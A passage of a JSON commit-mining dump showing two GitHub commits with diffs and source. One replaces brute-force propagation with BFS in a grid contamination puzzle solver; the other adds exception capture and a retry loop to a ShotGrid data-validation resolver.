for above_cell, current_cell in zip(prev_row, row):\n+                    if above_cell == STONE or current_cell == STONE:\n+                        continue\n                     g.ins_edge(above_cell, current_cell)\n             prev_row = row\n \n-        propagation(g)\n+        all_contamined = [v for v in g if v == CONTAMINANT]\n+        for contamined in all_contamined:\n+            for vertex in bfs(g, contamined):\n+                if vertex.value == WATER:\n+                    vertex.value = CONTAMINANT\n+                # display(SVG(g._repr_svg_()))\n \n         new_map = []\n         for row in map:\n             new_map.append(\"\".join(str(cell) for cell in row))\n         solutions.append(\"\\n\".join(new_map))\n \n-    print(\"\\n\\n\".join(solutions) + \"\\n\")\n+    return \"\\n\\n\".join(solutions) + \"\\n\"\n+\n+\n+\n+if __name__ == \"__main__\":\n+    rl = sys.stdin.readline\n+    solutions = main(rl)\n+    print(solutions)\n+\n","add":20,"remove":2,"filename":"\/problems\/uri_1583_contaminacao\/uri_1583_contaminacao.py","badparts":["        propagation(g)","    print(\"\\n\\n\".join(solutions) + \"\\n\")"],"goodparts":["                if cell == STONE:","                    prev_cell = None","                    continue","                    if above_cell == STONE or current_cell == STONE:","                        continue","        all_contamined = [v for v in g if v == CONTAMINANT]","        for contamined in all_contamined:","            for vertex in bfs(g, contamined):","                if vertex.value == WATER:","                    vertex.value = CONTAMINANT","    return \"\\n\\n\".join(solutions) + \"\\n\"","if __name__ == \"__main__\":","    rl = sys.stdin.readline","    solutions = main(rl)","    print(solutions)"]}],"source":"\n\nimport sys from collections import defaultdict, deque \"\"\" Map cell can contain: A: Water X: Stone T: Contaminant \"\"\" WATER=\"A\" STONE=\"X\" CONTAMINANT=\"T\" class Cell: def __init__(self, value, row, column): self.value=value self.row=row self.column=column def __hash__(self) -> int: return hash(self.value) +hash(self.row) +hash(self.column) def __eq__(self, o: object) -> bool: if isinstance(o, str): return self.value==o return self.value==o.value and self.row==o.row and self.column==o.column def __repr__(self) -> str: return f\"C({repr(self.value)},{self.row},{self.column})\" def __str__(self) -> str: return self.value class Graph: def __init__(self): self._g=defaultdict(deque) def ins_edge(self, v1, v2): self._g[v1].append(v2) self._g[v2].append(v1) def adjacents(self, vertex): if vertex not in self: return[] return self._g[vertex] def __repr__(self): return repr(self._g) def __contains__(self, vertex): return vertex in self._g def __iter__(self): return iter(self._g) @classmethod def from_edges(cls, edges): g=cls() for v1, v2 in edges: g.ins_edge(v1, v2) return g def propagation(g): \"\"\" Brute forcing here... I think that a BSF is applicable. \"\"\" keep_processing=True while keep_processing: keep_processing=False for vertex in g: for adj in g.adjacents(vertex): if vertex.value==WATER and adj.value==CONTAMINANT: vertex.value=CONTAMINANT keep_processing=True if __name__==\"__main__\": rl=sys.stdin.readline solutions=[] while True: n_lines, m_columns=[int(x) for x in rl().split()] if n_lines==m_columns==0: break map=[] for row in range(n_lines): row_contents=rl().strip() map.append( [Cell(item, row, column) for column, item in enumerate(row_contents)] ) g=Graph() prev_row=None for row in map: prev_cell=None for cell in row: if prev_cell: g.ins_edge(prev_cell, cell) prev_cell=cell if prev_row: for above_cell, current_cell in zip(prev_row, row): g.ins_edge(above_cell, current_cell) prev_row=row propagation(g) new_map=[] for row in map: new_map.append(\"\".join(str(cell) for cell in row)) solutions.append(\"\\n\".join(new_map)) print(\"\\n\\n\".join(solutions) +\"\\n\") ","sourceWithComments":"#!\/usr\/bin\/env python3\nimport sys\nfrom collections import defaultdict, deque\n\n\"\"\"\nMap cell can contain:\n\n    A: Water\n    X: Stone\n    T: Contaminant\n\"\"\"\nWATER = \"A\"\nSTONE = \"X\"\nCONTAMINANT = \"T\"\n\n\nclass Cell:\n    def __init__(self, value, row, column):\n        self.value = value\n        self.row = row\n        self.column = column\n\n    def __hash__(self) -> int:\n        return hash(self.value) + hash(self.row) + hash(self.column)\n\n    def __eq__(self, o: object) -> bool:\n        if isinstance(o, str):\n            return self.value == o\n        return self.value == o.value and self.row == o.row and self.column == o.column\n\n    def __repr__(self) -> str:\n        return f\"C({repr(self.value)}, {self.row}, {self.column})\"\n\n    def __str__(self) -> str:\n        return self.value\n\n\nclass Graph:\n    def __init__(self):\n        self._g = defaultdict(deque)\n\n    def ins_edge(self, v1, v2):\n        self._g[v1].append(v2)\n        self._g[v2].append(v1)\n\n    def adjacents(self, vertex):\n        if vertex not in self:\n            return []\n        return self._g[vertex]\n\n    def __repr__(self):\n        return repr(self._g)\n\n    def __contains__(self, vertex):\n        return vertex in self._g\n\n    def __iter__(self):\n        return iter(self._g)\n\n    @classmethod\n    def from_edges(cls, edges):\n        g = cls()\n        for v1, v2 in edges:\n            g.ins_edge(v1, v2)\n\n        return g\n\n\ndef propagation(g):\n    \"\"\"\n    Brute forcing here...  I think that a BSF is applicable.\n    \"\"\"\n    keep_processing = True\n    while keep_processing:\n        keep_processing = False\n        for vertex in g:\n            for adj in g.adjacents(vertex):\n                if vertex.value == WATER and adj.value == CONTAMINANT:\n                    vertex.value = CONTAMINANT\n                    keep_processing = True\n\n\nif __name__ == \"__main__\":\n    rl = sys.stdin.readline\n\n    solutions = []\n    while True:\n\n        n_lines, m_columns = [int(x) for x in rl().split()]\n\n        if n_lines == m_columns == 0:\n            break\n\n        map = []\n        for row in range(n_lines):\n            row_contents = rl().strip()\n            map.append(\n                [Cell(item, row, column) for column, item in enumerate(row_contents)]\n            )\n\n        g = Graph()\n        prev_row = None\n        for row in map:\n            prev_cell = None\n            for cell in row:\n                if prev_cell:\n                    g.ins_edge(prev_cell, cell)\n                prev_cell = cell\n            if prev_row:\n                for above_cell, current_cell in zip(prev_row, row):\n                    g.ins_edge(above_cell, current_cell)\n            prev_row = row\n\n        propagation(g)\n\n        new_map = []\n        for row in map:\n            new_map.append(\"\".join(str(cell) for cell in row))\n        solutions.append(\"\\n\".join(new_map))\n\n    print(\"\\n\\n\".join(solutions) + \"\\n\")\n"}},"msg":"chore: Improving uri_1583 using bfs instead of brute force"}},"https:\/\/github.com\/shotgunsoftware\/tk-multi-data-validation":{"c74709f235276107ee1cdcbcc7670685adbb53df":{"url":"https:\/\/api.github.com\/repos\/shotgunsoftware\/tk-multi-data-validation\/commits\/c74709f235276107ee1cdcbcc7670685adbb53df","html_url":"https:\/\/github.com\/shotgunsoftware\/tk-multi-data-validation\/commit\/c74709f235276107ee1cdcbcc7670685adbb53df","message":"[SHOT-4031] Brute force resolve all errors (#9)\n\n* Brute force keep trying to resolve all errors to handle reverse dependencies.\r\n* Update unit tests.\r\n* Improve error message reporting.\r\n* Catch any exceptions thrown during validation\/fix and report these errors to the user in a friendly way","sha":"c74709f235276107ee1cdcbcc7670685adbb53df","keyword":"brute force improve","diff":"diff --git a\/python\/tk_multi_data_validation\/api\/data\/validation_rule.py b\/python\/tk_multi_data_validation\/api\/data\/validation_rule.py\nindex 667455c..ad6121f 100644\n--- a\/python\/tk_multi_data_validation\/api\/data\/validation_rule.py\n+++ b\/python\/tk_multi_data_validation\/api\/data\/validation_rule.py\n@@ -125,6 +125,9 @@ def __init__(self, rule_data):\n         self._error_items = None\n         # Flag indicating that the rule fix method was executed at least once\n         self._fix_executed = False\n+        # Runtime exceptions caught - used to display error messages\n+        self._check_runtime_exception = None\n+        self._fix_runtime_exception = None\n \n     @property\n     def id(self):\n@@ -341,6 +344,44 @@ def get_error_item_ids(self):\n \n         return [item[\"id\"] for item in self.errors]\n \n+    def get_error_messages(self):\n+        \"\"\"\n+        Return the list of current error messages.\n+\n+        If there was a run time error during the check or fix function, the error messages will\n+        contain these run time error messages. The default error message will not be included.\n+\n+        If the check and fix functions executed successfully, then return the default error\n+        message for the rule (e.g. assumes if the check\/fix ran successfully than if there is\n+        an error, it will be due to finding actual validation errors related to the rule).\n+\n+        :return: The error messages.\n+        :rtype: list\n+        \"\"\"\n+\n+        messages = []\n+\n+        if self._check_runtime_exception:\n+            messages.append(\n+                \"Validation Error: {}\".format(self._check_runtime_exception)\n+            )\n+\n+        if self._fix_runtime_exception:\n+            messages.append(\"Fix Error: {}\".format(self._fix_runtime_exception))\n+\n+        if not self._check_runtime_exception and not self._fix_executed:\n+            # Only include the validation error message if both check and fix functions\n+            # executed successfully.\n+            rule_error = self._data.get(\"error_msg\")\n+\n+            if not rule_error and self.check_func:\n+                rule_error = \"Found errors.\"\n+\n+            if rule_error:\n+                messages.append(rule_error)\n+\n+        return messages\n+\n     def get_dependency_ids(self):\n         \"\"\"\n         Get the validation rules (ids) that this rule depends on.\n@@ -376,19 +417,27 @@ def exec_check(self, *args, **kwargs):\n \n         if func:\n             kwargs.update(self.kwargs)\n-            result = func(*args, **kwargs)\n-\n-            # Try to set the valid and errors data properties on the rule from the result returned by\n-            # the check function. If the result does not have the expected attributes, we will continue on\n-            # but the rule will not be updated\n             try:\n-                self._valid = result.is_valid\n-            except:\n-                pass\n-            try:\n-                self._error_items = result.errors\n-            except:\n-                pass\n+                result = func(*args, **kwargs)\n+                self._check_runtime_exception = None\n+            except Exception as runtime_error:\n+                result = None\n+                self._valid = False\n+                self._error_items = []\n+                self._check_runtime_exception = runtime_error\n+\n+            if result:\n+                # Try to set the valid and errors data properties on the rule from the result returned by\n+                # the check function. If the result does not have the expected attributes, we will continue on\n+                # but the rule will not be updated\n+                try:\n+                    self._valid = result.is_valid\n+                except:\n+                    pass\n+                try:\n+                    self._error_items = result.errors\n+                except:\n+                    pass\n         else:\n             # This is a manual check. It is considered valid if the user has checked it off.\n             self._valid = self.manual_checked\n@@ -418,7 +467,11 @@ def exec_fix(self, *args, **kwargs):\n             return\n \n         kwargs.update(self.kwargs)\n-        func(*args, **kwargs)\n-\n-        # The fix function was executed - set the flag to True\n-        self._fix_executed = True\n+        try:\n+            func(*args, **kwargs)\n+            self._fix_runtime_exception = None\n+        except Exception as runtime_error:\n+            self._fix_runtime_exception = runtime_error\n+        finally:\n+            # The fix function was executed - set the flag to True\n+            self._fix_executed = True\ndiff --git a\/python\/tk_multi_data_validation\/api\/manager.py b\/python\/tk_multi_data_validation\/api\/manager.py\nindex 51b8dcd..1d559d8 100644\n--- a\/python\/tk_multi_data_validation\/api\/manager.py\n+++ b\/python\/tk_multi_data_validation\/api\/manager.py\n@@ -281,7 +281,9 @@ def validate_rule(self, rule, emit_signals=True):\n \n         return is_valid\n \n-    def resolve(self, pre_validate=False, post_validate=False):\n+    def resolve(\n+        self, pre_validate=False, post_validate=False, retry_until_success=True\n+    ):\n         \"\"\"\n         Resolve the current data violations found by the validate method.\n \n@@ -295,6 +297,11 @@ def resolve(self, pre_validate=False, post_validate=False):\n         :param post_validate: True will run the validation step after the resolve step, to check that\n                               the scene data is valid after resolution steps applied.\n         :type post_validate: bool\n+        :param retry_until_success: Set to True will try to fun the resolution operation until all\n+            rules have been resolved. The maximum number of tries to resolve will be equal to the\n+            number of rules in the manager. This will perform post validate step, evne if post validate\n+            has been set to False.\n+        :type retry_until_success: bool\n \n         :return: True if the resolve operation was successful, else False. Note that if the post_validate\n             param is False, this will always be True, since the return status is based on the status\n@@ -322,10 +329,51 @@ def resolve(self, pre_validate=False, post_validate=False):\n                     self.errors.values(), fetch_dependencies=False, emit_signals=False\n                 )\n \n-                if post_validate:\n+                if post_validate or retry_until_success:\n                     # Run validation step once all resolution actions compelted to ensure everything was fixed.\n                     success = self.validate()\n \n+                # Brute force try to resolve all errors - keep running the resolution on any errors found\n+                # from validate until there are none, or the max number of tries reached.\n+                #\n+                # New errors may occur if executing a rule's fix has side effects which cause another rule to\n+                # have errors. For example, rule A has no dependencies, rule B depends on rule A, and rule A\n+                # has errors, then only rule A's fix will be executed but it causes rule B to now have errors.\n+                # Rule B's fix will not be executed though, so even though resolve all was executed, we have\n+                # new errors.\n+                #\n+                # NOTE if this brute force method becomes slow, the resolve_rules method should be modified to\n+                # look up the reverse dependencies to add to the list of rules whose fix operatoins will be\n+                # executed.\n+                max_retry = len(self.rules) if retry_until_success else 0\n+                count = 0\n+                prev_errors = set()\n+                while not success and count < max_retry:\n+                    if prev_errors == set(self.errors):\n+                        # Nothing changed from the last attempt to resolve, stop retrying\n+                        count = max_retry\n+                    else:\n+                        self._logger.debug(\"Resolve retry attempt {}\".format(count))\n+\n+                        # Update the previous errors to the current set\n+                        prev_errors = set(self.errors)\n+\n+                        # Attempt to resolve again\n+                        self.resolve_rules(\n+                            self.errors.values(),\n+                            fetch_dependencies=False,\n+                            emit_signals=False,\n+                        )\n+                        # Check for errors\n+                        success = self.validate()\n+                        # Update retry count\n+                        count += 1\n+\n+                if retry_until_success and not success:\n+                    self._logger.debug(\n+                        \"Failed to resolve after max retry attempts. There may be a rule dependecy cycle.\"\n+                    )\n+\n         finally:\n             if self.notifier:\n                 self.notifier.resolve_all_finished.emit()\n@@ -380,8 +428,8 @@ def resolve_rules(self, rules, fetch_dependencies=None, emit_signals=True):\n \n         try:\n             # The set of rule ids passed to resolve - this set gets populated the first the rules are iterated\n-            # through to check then check if the necessary dependencies are available to resolve first.\n-            # Dependency rules may be added in the step wheere dependencies are checked.\n+            # through to check then check if the necessary dependencies are available to resolve first. Any\n+            # dependency rules will be added in the step wheere dependencies are checked.\n             rule_ids = set()\n             # Add rules to the set once they have been resolved.\n             resolved = set()\ndiff --git a\/python\/tk_multi_data_validation\/models\/validation_rule_model.py b\/python\/tk_multi_data_validation\/models\/validation_rule_model.py\nindex 3c38d7c..b310e5e 100644\n--- a\/python\/tk_multi_data_validation\/models\/validation_rule_model.py\n+++ b\/python\/tk_multi_data_validation\/models\/validation_rule_model.py\n@@ -227,13 +227,14 @@ def data(self, role):\n                     )\n \n                 lines = []\n+                error_messages = self._rule.get_error_messages()\n                 if (\n                     self.data(ValidationRuleModel.RULE_HAS_ERROR_ROLE)\n-                    and self._rule.error_message\n+                    and error_messages\n                 ):\n                     lines.append(\n                         \"<span style='color:#EB5555;'>{}<\/span>\".format(\n-                            self._rule.error_message\n+                            \"<br\/>\".join(error_messages)\n                         )\n                     )\n                 if (\ndiff --git a\/tests\/test_validation_manager.py b\/tests\/test_validation_manager.py\nindex c552e1d..939df0d 100644\n--- a\/tests\/test_validation_manager.py\n+++ b\/tests\/test_validation_manager.py\n@@ -552,7 +552,7 @@ def test_manager_resolve_notifier_signals(bundle, notifier):\n     manager.validate()\n     expected_calls = [call(r) for r in manager.rules if not r.valid]\n \n-    manager.resolve()\n+    manager.resolve(retry_until_success=False)\n \n     manager.notifier.resolve_all_begin.emit.assert_called_once()\n     manager.notifier.resolve_all_finished.emit.assert_called_once()\n@@ -572,7 +572,7 @@ def test_manager_resolve_with_pre_validate_notifier_signals(bundle, notifier):\n \n     manager = ValidationManager(bundle, notifier=notifier)\n \n-    manager.resolve(pre_validate=True)\n+    manager.resolve(pre_validate=True, retry_until_success=False)\n \n     manager.notifier.validate_all_begin.emit.assert_called_once()\n     manager.notifier.validate_all_finished.emit.assert_called_once()\n","files":{"\/python\/tk_multi_data_validation\/api\/data\/validation_rule.py":{"changes":[{"diff":"\n \n         if func:\n             kwargs.update(self.kwargs)\n-            result = func(*args, **kwargs)\n-\n-            # Try to set the valid and errors data properties on the rule from the result returned by\n-            # the check function. If the result does not have the expected attributes, we will continue on\n-            # but the rule will not be updated\n             try:\n-                self._valid = result.is_valid\n-            except:\n-                pass\n-            try:\n-                self._error_items = result.errors\n-            except:\n-                pass\n+                result = func(*args, **kwargs)\n+                self._check_runtime_exception = None\n+            except Exception as runtime_error:\n+                result = None\n+                self._valid = False\n+                self._error_items = []\n+                self._check_runtime_exception = runtime_error\n+\n+            if result:\n+                # Try to set the valid and errors data properties on the rule from the result returned by\n+                # the check function. If the result does not have the expected attributes, we will continue on\n+                # but the rule will not be updated\n+                try:\n+                    self._valid = result.is_valid\n+                except:\n+                    pass\n+                try:\n+                    self._error_items = result.errors\n+                except:\n+                    pass\n         else:\n             # This is a manual check. It is considered valid if the user has checked it off.\n             self._valid = self.manual_checked\n","add":20,"remove":12,"filename":"\/python\/tk_multi_data_validation\/api\/data\/validation_rule.py","badparts":["            result = func(*args, **kwargs)","                self._valid = result.is_valid","            except:","                pass","            try:","                self._error_items = result.errors","            except:","                pass"],"goodparts":["                result = func(*args, **kwargs)","                self._check_runtime_exception = None","            except Exception as runtime_error:","                result = None","                self._valid = False","                self._error_items = []","                self._check_runtime_exception = runtime_error","            if result:","                try:","                    self._valid = result.is_valid","                except:","                    pass","                try:","                    self._error_items = result.errors","                except:","                    pass"]},{"diff":"\n             return\n \n         kwargs.update(self.kwargs)\n-        func(*args, **kwargs)\n-\n-        # The fix function was executed - set the flag to True\n-        self._fix_executed = True\n+        try:\n+            func(*args, **kwargs)\n+            self._fix_runtime_exception = None\n+        except Exception as runtime_error:\n+            self._fix_runtime_exception = runtime_error\n+        finally:\n+            # The fix function was executed - set the flag to True\n+            self._fix_executed = True","add":8,"remove":4,"filename":"\/python\/tk_multi_data_validation\/api\/data\/validation_rule.py","badparts":["        func(*args, **kwargs)","        self._fix_executed = True"],"goodparts":["        try:","            func(*args, **kwargs)","            self._fix_runtime_exception = None","        except Exception as runtime_error:","            self._fix_runtime_exception = runtime_error","        finally:","            self._fix_executed = True"]}],"source":"\n from.validation_rule_type import ValidationRuleType class ValidationRule(object): \"\"\" A validation rule to be applied to the DCC data, which determines if the DCC data is valid or not. The key properties of the rule are the `check_func` and `fix_func`; these functions define the how the DCC data is validated and provides an automated function to resolve data that is not valid. See the list of class properties below for more information on what data is contained in the validation rule object. \"\"\" def __init__(self, rule_data): \"\"\" Create a validation rule with the provided data. :param rule_data: The data that defines the rule. :type rule_data: dict **rule_data dict format** key :type: str :description: The unique identifier for this rule. name :type: str :description: The display name for this rule. data_type: :type: str :description: The name of the data type that this rule pertains to. description :type: str :description: Text that describes what the rule checks for in the data. required :type: bool :description: True indicates that this rule should be applied when validating the data. checked :type: bool :description: True indicates that this rule has a checked state(for UI purposes), False indicates the rule is unchecked. check_name :type: str :description: The display name for the rule's check function. check_func :type: function :description: The function the rule executes to check the data for violations agains the rule. fix_name :type: str :description: The display name for the rule's fix function. fix_func :type: function :description: The function the rule executes to fix the data violations found after applying the rule's check function to the data. fix_tooltip :type: str :description: Text that describes what the rule's fix function will do. error_msg :type: str :description: Text that describes how the data is not valid. warn_msg :type: str :description: Text that describes the warning for this rule. kwargs :type: dict :description: The keyword arguments to pass to the check and fix functions. actions :type: list<dict> :description: A list of actions that can be applied to the data to resolve any errors for this rule. **Required Keys** name :type: str :description: The display text for the action. callback :type: function :description: The function to call when the action is invoked. **Optional Keys** tooltip :type: str :description: Text to display as for the item action's tooltip help messages. item_actions :type: list<dict> :description: A list of actions that can be applied to the particular data for this rule, to resolve the error. **Required Keys** name :type: str :description: The display text for the action. callback :type: function :description: The function to call when the action is invoked. **Optional Keys** tooltip :type: str :description: Text to display as for the item action's tooltip help messages. dependencies :type: dict<str> :description: A dict of the valiation rule ids that this rule depends on and their display name. All dependency rules must be fixed before this rule can be fixed. \"\"\" self._data=rule_data or{} self._optional_checked=self._data.get(\"checked\", False) self._manual_checked=False self._rule_type=ValidationRuleType.get_type_for_rule(self) self._valid=None self._error_items=None self._fix_executed=False @property def id(self): \"\"\"Get the unique identifier for this rule.\"\"\" return self._data.get(\"id\") @property def type(self): \"\"\"Get the:class:`ValidationRuleType` of this rule.\"\"\" return self._rule_type @property def rule_type_name(self): \"\"\"Get the display name for the type of this rule.\"\"\" return self.type.name @property def data_type(self): \"\"\"Get the data type that this rule peratins to.\"\"\" return self._data.get(\"data_type\") @property def name(self): \"\"\"Get the display name for thsi rule.\"\"\" return self._data.get(\"name\", \"\") @property def description(self): \"\"\"Get the description text for what this rule does.\"\"\" return self._data.get(\"description\", \"\") @property def required(self): \"\"\"Get the property flag indicating if this rule should be executed to validate the data.\"\"\" return self._data.get(\"required\", True) @property def manual(self): \"\"\" Get the property flag indicating if this rule cannot be automatically checked. These types of rules must be manually validated by user. \"\"\" return not(bool(self.check_func) or bool(self.fix_func)) @property def optional(self): \"\"\" Get the property flag indicating if this rule is optional. \"\"\" return not self.required @property def check_name(self): \"\"\"Get the display name for the check function of this rule.\"\"\" return self._data.get(\"check_name\", \"Validate\") @property def fix_name(self): \"\"\"Get the display name for the fix function of this rule.\"\"\" return self._data.get(\"fix_name\", \"Fix\") @property def fix_tooltip(self): \"\"\"Get the text that describes what the fix function does for this rule.\"\"\" return self._data.get(\"fix_tooltip\", \"Click to fix this data violation.\") @property def error_message(self): \"\"\"Get the text that describes how the data is not valid.\"\"\" default_msg=\"Found errors.\" if self.check_func else \"\" return self._data.get(\"error_msg\", default_msg) @property def warn_message(self): \"\"\"Get the text that describes the warning for this rule.\"\"\" default_msg=\"Validatoin must be manually checked.\" if self.manual else \"\" return self._data.get(\"warn_msg\", default_msg) @property def checked(self): \"\"\" Get the set the property flag indicating that an optional rule is checked(turned on). This is meant to be used to set the UI check state for an optional rule. \"\"\" return self._optional_checked @checked.setter def checked(self, checked): self._optional_checked=checked @property def manual_checked(self): \"\"\" Get the set the property flag indicating that a manual rule is checked(user set as valid). This is meant to be used to set the UI check state for a manual rule. \"\"\" return self._manual_checked @manual_checked.setter def manual_checked(self, checked): self._manual_checked=checked @property def check_func(self): \"\"\" Get the function that this rule executes to validate the data. It is encouraged to use the `exec_check` method instead of getting this function and calling it directly. \"\"\" return self._data.get(\"check_func\") @property def fix_func(self): \"\"\" Get the function that this rule executes to fix the data violations found by the rule. It is encouraged to use the `exec_fix` method instead of getting this function and calling it directly. \"\"\" return self._data.get(\"fix_func\") @property def kwargs(self): \"\"\"Get the extra keyword arguments dict to pass to the check and fix functions.\"\"\" return self._data.get(\"kwargs\",{}) @property def actions(self): \"\"\" Get the list of actions that can be applied to all error items(as a group) for this rule. These do no include the primary check or fix functions. This property is a list of dicts, which contain a `name` and `callback` keys, and optionally contains keys: `tooltip`. \"\"\" return self._data.get(\"actions\",[]) @property def item_actions(self): \"\"\" Get the list of actions that can be applied invididual error items(one at a time) for this rule. These do no include the primary check or fix functions. This property is a list of dicts, which contain a `name` and `callback` keys, and optionally contains keys: `tooltip`. \"\"\" return self._data.get(\"item_actions\",[]) @property def valid(self): \"\"\" Get the valid state of the rule. This will reflect the status returned by the rule's check function the last time it was executed. \"\"\" return self._valid @property def errors(self): \"\"\" Get the error data found for this rule. This will contain the error data items found by the rule's check function the last time it was executed. \"\"\" return self._error_items or[] @property def fix_executed(self): \"\"\" Get the flag indicating if the rule's fix method was executed at least once. \"\"\" return self._fix_executed @property def dependencies(self): \"\"\" Get the dependencies information for this rule. Dependent rules must be fixed before this rule can be fixed. This defines the order that rules are fixed in, when fixing in bulk. \"\"\" return self._data.get(\"dependencies\",{}) def get_data(self, field): \"\"\" Get the data from the rule. :param field: The field to get data for :type field: str :return: The data for the specified field :rtype: any \"\"\" return self._data.get(field) def get_error_item_ids(self): \"\"\" Convenience method to get a list of the item ids from the data errors. :return: The item ids of the error items. :rtype: list \"\"\" return[item[\"id\"] for item in self.errors] def get_dependency_ids(self): \"\"\" Get the validation rules(ids) that this rule depends on. Dependent rules must be fixed before this rule can be fixed. This defines the order that rules are fixed in, when fixing in bulk. \"\"\" return self.dependencies.keys() def get_dependency_names(self): \"\"\" Get the validation rules(display names) that this rule depends on. Dependent rules must be fixed before this rule can be fixed. This defines the order that rules are fixed in, when fixing in bulk. \"\"\" return self.dependencies.values() def exec_check(self, *args, **kwargs): \"\"\" Execute the rule's check function. :param args: The arguments lits to pass to the check function :type args: list :param kwargs: The keyword arguments to pass to the check function :type kwargs: dict :return: The result returned by the check function :rtype: any \"\"\" func=self.check_func if func: kwargs.update(self.kwargs) result=func(*args, **kwargs) try: self._valid=result.is_valid except: pass try: self._error_items=result.errors except: pass else: self._valid=self.manual_checked self._error_items=[] result=None return result def exec_fix(self, *args, **kwargs): \"\"\" Execute the rule's fix function. Note that if this rule has dependencies, this method does not take those into account. See the ValidationManager resolve methods to handle rule dependencies. :param args: The arguments lits to pass to the check function :type args: list :param kwargs: The keyword arguments to pass to the check function :type kwargs: dict :raises Exception: If the fix operation was not successful. \"\"\" func=self.fix_func if not func: return kwargs.update(self.kwargs) func(*args, **kwargs) self._fix_executed=True ","sourceWithComments":"# Copyright (c) 2022 Autodesk, Inc.\n#\n# CONFIDENTIAL AND PROPRIETARY\n#\n# This work is provided \"AS IS\" and subject to the ShotGrid Pipeline Toolkit\n# Source Code License included in this distribution package. See LICENSE.\n# By accessing, using, copying or modifying this work you indicate your\n# agreement to the ShotGrid Pipeline Toolkit Source Code License. All rights\n# not expressly granted therein are reserved by Autodesk, Inc.\n\nfrom .validation_rule_type import ValidationRuleType\n\n\nclass ValidationRule(object):\n    \"\"\"\n    A validation rule to be applied to the DCC data, which determines if the DCC data is valid or not.\n\n    The key properties of the rule are the `check_func` and `fix_func`; these functions define the how the\n    DCC data is validated and provides an automated function to resolve data that is not valid. See the list\n    of class properties below for more information on what data is contained in the validation rule object.\n    \"\"\"\n\n    def __init__(self, rule_data):\n        \"\"\"\n        Create a validation rule with the provided data.\n\n        :param rule_data: The data that defines the rule.\n        :type rule_data: dict\n\n        **rule_data dict format**\n            key\n                :type: str\n                :description: The unique identifier for this rule.\n            name\n                :type: str\n                :description: The display name for this rule.\n            data_type:\n                :type: str\n                :description: The name of the data type that this rule pertains to.\n            description\n                :type: str\n                :description: Text that describes what the rule checks for in the data.\n            required\n                :type: bool\n                :description: True indicates that this rule should be applied when validating the data.\n            checked\n                :type: bool\n                :description: True indicates that this rule has a checked state (for UI purposes), False indicates the rule is unchecked.\n            check_name\n                :type: str\n                :description: The display name for the rule's check function.\n            check_func\n                :type: function\n                :description: The function the rule executes to check the data for violations agains the rule.\n            fix_name\n                :type: str\n                :description: The display name for the rule's fix function.\n            fix_func\n                :type: function\n                :description: The function the rule executes to fix the data violations found after applying the rule's check function to the data.\n            fix_tooltip\n                :type: str\n                :description: Text that describes what the rule's fix function will do.\n            error_msg\n                :type: str\n                :description: Text that describes how the data is not valid.\n            warn_msg\n                :type: str\n                :description: Text that describes the warning for this rule.\n            kwargs\n                :type: dict\n                :description: The keyword arguments to pass to the check and fix functions.\n            actions\n                :type: list<dict>\n                :description: A list of actions that can be applied to the data to resolve any errors for this rule.\n\n                **Required Keys**\n                    name\n                        :type: str\n                        :description: The display text for the action.\n                    callback\n                        :type: function\n                        :description: The function to call when the action is invoked.\n\n                **Optional Keys**\n                    tooltip\n                        :type: str\n                        :description: Text to display as for the item action's tooltip help messages.\n            item_actions\n                :type: list<dict>\n                :description: A list of actions that can be applied to the particular data for this rule, to resolve the error.\n\n                **Required Keys**\n                    name\n                        :type: str\n                        :description: The display text for the action.\n                    callback\n                        :type: function\n                        :description: The function to call when the action is invoked.\n\n                **Optional Keys**\n                    tooltip\n                        :type: str\n                        :description: Text to display as for the item action's tooltip help messages.\n            dependencies\n                :type: dict<str>\n                :description: A dict of the valiation rule ids that this rule depends on and their display name. All dependency rules must be fixed before this rule can be fixed.\n        \"\"\"\n\n        # Set the main rule data\n        self._data = rule_data or {}\n\n        # The checked property can be updated at runtime by user interaction. Initailzie the default value.\n        self._optional_checked = self._data.get(\"checked\", False)\n        # This indicates whether the user checked the manual rule as being \"done\"\n        self._manual_checked = False\n\n        # Get the validatin rule type object for this rule\n        self._rule_type = ValidationRuleType.get_type_for_rule(self)\n\n        # Initialize valid property to None, indicating that this rule has not been checked yet.\n        # Set to True once check has been run and the rule fails, or False if it passes.\n        self._valid = None\n        # The error items found the last time the rule's check function was executed.\n        self._error_items = None\n        # Flag indicating that the rule fix method was executed at least once\n        self._fix_executed = False\n\n    @property\n    def id(self):\n        \"\"\"Get the unique identifier for this rule.\"\"\"\n        return self._data.get(\"id\")\n\n    @property\n    def type(self):\n        \"\"\"Get the :class:`ValidationRuleType` of this rule.\"\"\"\n        return self._rule_type\n\n    @property\n    def rule_type_name(self):\n        \"\"\"Get the display name for the type of this rule.\"\"\"\n        return self.type.name\n\n    @property\n    def data_type(self):\n        \"\"\"Get the data type that this rule peratins to.\"\"\"\n\n        return self._data.get(\"data_type\")\n\n    @property\n    def name(self):\n        \"\"\"Get the display name for thsi rule.\"\"\"\n        return self._data.get(\"name\", \"\")\n\n    @property\n    def description(self):\n        \"\"\"Get the description text for what this rule does.\"\"\"\n        return self._data.get(\"description\", \"\")\n\n    @property\n    def required(self):\n        \"\"\"Get the property flag indicating if this rule should be executed to validate the data.\"\"\"\n        return self._data.get(\"required\", True)\n\n    @property\n    def manual(self):\n        \"\"\"\n        Get the property flag indicating if this rule cannot be automatically checked.\n\n        These types of rules must be manually validated by user.\n        \"\"\"\n\n        return not (bool(self.check_func) or bool(self.fix_func))\n\n    @property\n    def optional(self):\n        \"\"\"\n        Get the property flag indicating if this rule is optional.\n        \"\"\"\n        return not self.required\n\n    @property\n    def check_name(self):\n        \"\"\"Get the display name for the check function of this rule.\"\"\"\n        return self._data.get(\"check_name\", \"Validate\")\n\n    @property\n    def fix_name(self):\n        \"\"\"Get the display name for the fix function of this rule.\"\"\"\n        return self._data.get(\"fix_name\", \"Fix\")\n\n    @property\n    def fix_tooltip(self):\n        \"\"\"Get the text that describes what the fix function does for this rule.\"\"\"\n        return self._data.get(\"fix_tooltip\", \"Click to fix this data violation.\")\n\n    @property\n    def error_message(self):\n        \"\"\"Get the text that describes how the data is not valid.\"\"\"\n        default_msg = \"Found errors.\" if self.check_func else \"\"\n        return self._data.get(\"error_msg\", default_msg)\n\n    @property\n    def warn_message(self):\n        \"\"\"Get the text that describes the warning for this rule.\"\"\"\n        default_msg = \"Validatoin must be manually checked.\" if self.manual else \"\"\n        return self._data.get(\"warn_msg\", default_msg)\n\n    @property\n    def checked(self):\n        \"\"\"\n        Get the set the property flag indicating that an optional rule is checked (turned on).\n\n        This is meant to be used to set the UI check state for an optional rule.\n        \"\"\"\n\n        return self._optional_checked\n\n    @checked.setter\n    def checked(self, checked):\n        self._optional_checked = checked\n\n    @property\n    def 